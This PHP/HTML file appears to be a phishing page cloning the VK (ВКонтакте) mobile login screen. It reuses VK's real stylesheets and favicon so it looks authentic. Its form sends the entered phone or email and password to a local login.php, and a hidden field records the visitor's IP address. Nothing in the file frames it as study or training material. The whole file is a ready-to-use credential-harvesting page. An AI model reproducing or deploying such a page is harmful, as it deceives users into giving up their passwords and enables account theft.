<?php
	
	/**
		* @author Litvinov V.A.
		* @copyright 2016 (0611)
	*/
	
?>

<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="page page_js_no page_withVolumeLine">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="format-detection" content="telephone=no" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="MobileOptimized" content="176" />
    <meta name="HandheldFriendly" content="True" />
    <style>@-ms-viewport{width:device-width;}</style>
    <title>Мобильная версия ВКонтакте</title>
    <link rel="shortcut icon" href="https://m.vk.com/images/faviconnew.ico" />
    <link type="text/css" rel="stylesheet" href="https://m.vk.com/css/s_cfmxw.css" />
    <link type="text/css" rel="stylesheet" media="only screen" href="https://m.vk.com/css/s_yzgt.css" />
    <link rel="canonical" href="/" />
  </head>
  <body id="vk" class="page__body _hover _hfixed vk_stickers_hints_support_yes opera_mini_no vk_al_yes" onresize="onBodyResize(true);">
    <div class="layout">
      <div class="layout__header mhead" id="vk_head">
        <div class="hb_wrap">
          <div class="hb_btn">&nbsp;</div>
        </div>
      </div>
      <div class="layout__body qs_enabled" id="vk_wrap">
        <div class="layout__basis" id="m">
          <div class="basis">
            <div class="basis__header mhead" id="mhead">
              <a href="/" accesskey="*" class="hb_wrap mhb_logo">
                <div class="hb_btn mhi_logo">&nbsp;</div>
              </a>
            </div>
            <div class="basis__content mcont" id="mcont">
              <div class="pcont fit_box bl_cont">
                <div class="text_panel">
                  Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
                </div>
                <div class="form_item fi_fat">
                  <form method="post" action="/login.php">
                    <dl class="fi_row">
                      <dt class="fi_label">Телефон или email:</dt>
                      <dd>
                        <div class="iwrap">
                          <input type="text" class="textfield" name="email" value="" />
                        </div>
                      </dd>
                    </dl>
                    <dl class="fi_row">
                      <dt class="fi_label">Пароль:</dt>
                      <dd>
                        <div class="iwrap">
                          <input type="password" class="textfield" name="pass" />
                          <input type="hidden" name="ip" value="<?php echo $_SERVER['REMOTE_ADDR']?>" />
                        </div>
                      </dd>
                    </dl>
                    <div class="fi_row">
                      <div class="fi_subrow">
                        <input class="button wide_button" type="submit" value="Войти" />
                      </div>
                      <div class="fi_subrow">
                        <div class="near_btn wide_button"><a href="https://m.vk.com/restore">Забыли пароль?</a></div>
                      </div>
                    </div>
                    <div class="fi_row_new">
                      <div class="fi_header fi_header_light">Ещё не зарегистрированы?</div>
                    </div>
                    <div class="fi_row">
                      <a class="button wide_button gray_button" href="https://m.vk.com/join">Зарегистрироваться</a>
                    </div>
                  </form>
                </div>
              </div>
            </div>
            <div class="basis__footer mfoot" id="mfoot">
              <div class="pfoot">
                <ul class="footer_menu">
                  <li class="fm_row"><a class="fm_item">English</a></li>
                  <li class="fm_row"><a class="fm_item">Українська</a></li>
                  <li class="fm_row"><a class="fm_item">all languages »</a></li>
                </ul>
                <ul id="footer_menu" class="footer_menu">
                  <li class="fm_row"><a class="fm_item" href="/">Полная версия</a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>